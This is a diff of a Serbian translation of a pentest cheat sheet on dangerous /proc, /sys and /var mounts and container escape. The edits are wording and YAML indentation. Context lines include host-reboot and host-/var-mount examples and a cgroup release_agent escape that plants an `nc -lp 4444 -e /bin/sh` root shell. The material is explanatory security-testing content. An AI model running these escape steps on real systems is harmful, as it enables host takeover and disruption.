@@ -4,7 +4,7 @@
 
 Izlaganje `/proc`, `/sys` i `/var` bez odgovarajuće izolacije prostora imena uvodi značajne bezbednosne rizike, uključujući povećanje napadačke površine i otkrivanje informacija. Ovi direktorijumi sadrže osetljive datoteke koje, ako su pogrešno konfigurisane ili pristupene od strane neovlašćenog korisnika, mogu dovesti do bekstva iz kontejnera, modifikacije hosta ili pružiti informacije koje pomažu daljim napadima. Na primer, pogrešno montiranje `-v /proc:/host/proc` može zaobići AppArmor zaštitu zbog svoje putanje, ostavljajući `/host/proc` nezaštićenim.
 
-**Možete pronaći dodatne detalje o svakoj potencijalnoj ranjivosti u** [**https://0xn3va.gitbook.io/cheat-sheets/container/escaping/sensitive-mounts**](https://0xn3va.gitbook.io/cheat-sheets/container/escaping/sensitive-mounts)**.**
+**Možete pronaći dalјe detalje o svakoj potencijalnoj ranjivosti u** [**https://0xn3va.gitbook.io/cheat-sheets/container/escaping/sensitive-mounts**](https://0xn3va.gitbook.io/cheat-sheets/container/escaping/sensitive-mounts)**.**
 
 ## procfs Vulnerabilities
 
@@ -16,7 +16,7 @@ Ovaj direktorijum omogućava pristup za modifikaciju kernel varijabli, obično p
 
 - Opisano u [core(5)](https://man7.org/linux/man-pages/man5/core.5.html).
 - Ako možete da pišete unutar ove datoteke, moguće je napisati cevi `|` praćene putanjom do programa ili skripte koja će biti izvršena nakon što dođe do kvara.
-- Napadač može pronaći putanju unutar hosta do svog kontejnera izvršavajući `mount` i napisati putanju do binarnog fajla unutar svog kontejnerskog fajl sistema. Zatim, izazvati kvar programa kako bi naterao kernel da izvrši binarni fajl van kontejnera.
+- Napadač može pronaći putanju unutar hosta do svog kontejnera izvršavajući `mount` i napisati putanju do binarne datoteke unutar svog kontejnerskog datotečnog sistema. Zatim, izazvati kvar programa kako bi naterao kernel da izvrši binarnu datoteku van kontejnera.
 
 - **Primer testiranja i eksploatacije**:
 ```bash
@@ -49,17 +49,17 @@ ls -l $(cat /proc/sys/kernel/modprobe) # Proveri pristup modprobe
 
 #### **`/proc/sys/vm/panic_on_oom`**
 
-- Referencirano u [proc(5)](https://man7.org/linux/man-pages/man5/proc.5.html).
+- Pominje se u [proc(5)](https://man7.org/linux/man-pages/man5/proc.5.html).
 - Globalna zastavica koja kontroliše da li kernel panici ili poziva OOM killer kada dođe do OOM uslova.
 
 #### **`/proc/sys/fs`**
 
-- Prema [proc(5)](https://man7.org/linux/man-pages/man5/proc.5.html), sadrži opcije i informacije o datotečnom sistemu.
+- Prema [proc(5)](https://man7.org/linux/man-pages/man5/proc.5.html), sadrži opcije i informacije o fajl sistemu.
 - Pristup za pisanje može omogućiti razne napade uskraćivanja usluge protiv hosta.
 
 #### **`/proc/sys/fs/binfmt_misc`**
 
-- Omogućava registraciju interpretera za nenativne binarne formate na osnovu njihovog magičnog broja.
+- Omogućava registraciju interpretatora za nenativne binarne formate na osnovu njihovog magičnog broja.
 - Može dovesti do eskalacije privilegija ili pristupa root shell-u ako je `/proc/sys/fs/binfmt_misc/register` moguće pisati.
 - Relevantna eksploatacija i objašnjenje:
 - [Poor man's rootkit via binfmt_misc](https://github.com/toffan/binfmt_misc)
@@ -88,7 +88,7 @@ echo b > /proc/sysrq-trigger # Restartuje host
 
 #### **`/proc/kallsyms`**
 
-- Lista kernel izvezene simbole i njihove adrese.
+- Lista kernel eksportovane simbole i njihove adrese.
 - Osnovno za razvoj kernel eksploatacija, posebno za prevazilaženje KASLR-a.
 - Informacije o adresama su ograničene kada je `kptr_restrict` postavljen na `1` ili `2`.
 - Detalji u [proc(5)](https://man7.org/linux/man-pages/man5/proc.5.html).
@@ -103,17 +103,17 @@ echo b > /proc/sysrq-trigger # Restartuje host
 
 - Predstavlja fizičku memoriju sistema u ELF core formatu.
 - Čitanje može otkriti sadržaj memorije host sistema i drugih kontejnera.
-- Velika veličina datoteke može dovesti do problema sa čitanjem ili rušenjem softvera.
+- Velika veličina fajla može dovesti do problema sa čitanjem ili rušenja softvera.
 - Detaljna upotreba u [Dumping /proc/kcore in 2019](https://schlafwandler.github.io/posts/dumping-/proc/kcore/).
 
 #### **`/proc/kmem`**
 
-- Alternativni interfejs za `/dev/kmem`, koji predstavlja kernel virtuelnu memoriju.
+- Alternativni interfejs za `/dev/kmem`, predstavlja kernel virtuelnu memoriju.
 - Omogućava čitanje i pisanje, što omogućava direktnu modifikaciju kernel memorije.
 
 #### **`/proc/mem`**
 
-- Alternativni interfejs za `/dev/mem`, koji predstavlja fizičku memoriju.
+- Alternativni interfejs za `/dev/mem`, predstavlja fizičku memoriju.
 - Omogućava čitanje i pisanje, modifikacija sve memorije zahteva rešavanje virtuelnih do fizičkih adresa.
 
 #### **`/proc/sched_debug`**
@@ -131,7 +131,7 @@ echo b > /proc/sysrq-trigger # Restartuje host
 #### **`/sys/kernel/uevent_helper`**
 
 - Koristi se za rukovanje kernel uređajima `uevents`.
-- Pisanje u `/sys/kernel/uevent_helper` može izvršiti proizvoljne skripte prilikom aktiviranja `uevent`.
+- Pisanje u `/sys/kernel/uevent_helper` može izvršiti proizvoljne skripte prilikom aktiviranja `uevent`-a.
 - **Primer za eksploataciju**:
 ```bash
 
@@ -199,17 +199,17 @@ metadata:
     app: pentest  
 spec:  
   containers:  
-  - name: pod-mounts-var-folder  
-    image: alpine  
-    volumeMounts:  
-    - mountPath: /host-var  
-      name: noderoot  
-    command: [ "/bin/sh", "-c", "--" ]  
-    args: [ "while true; do sleep 30; done;" ]  
+    - name: pod-mounts-var-folder  
+      image: alpine  
+      volumeMounts:  
+        - mountPath: /host-var  
+          name: noderoot  
+      command: [ "/bin/sh", "-c", "--" ]  
+      args: [ "while true; do sleep 30; done;" ]  
   volumes:  
-  - name: noderoot  
-    hostPath:  
-      path: /var
+    - name: noderoot  
+      hostPath:  
+        path: /var
 ```
 
 Inside the **pod-mounts-var-folder** container:
@@ -320,7 +320,7 @@ mkdir -p /tmp/x && echo 1 > /tmp/x/notify_on_release
 echo '/tmp/pwn' > /sys/fs/cgroup/release_agent   # zahteva CVE-2022-0492
 
 echo -e '#!/bin/sh\nnc -lp 4444 -e /bin/sh' > /tmp/pwn && chmod +x /tmp/pwn
-sh -c "echo 0 > /tmp/x/cgroup.procs"  # aktivira događaj praznog cgrupa
+sh -c "echo 0 > /tmp/x/cgroup.procs"  # pokreće događaj praznog cgrupa
 ```
 
 When the last process leaves the cgroup, `/tmp/pwn` runs **as root on the host**. Patched kernels (>5.8 with commit `32a0db39f30d`) validate the writer’s capabilities and block this abuse.
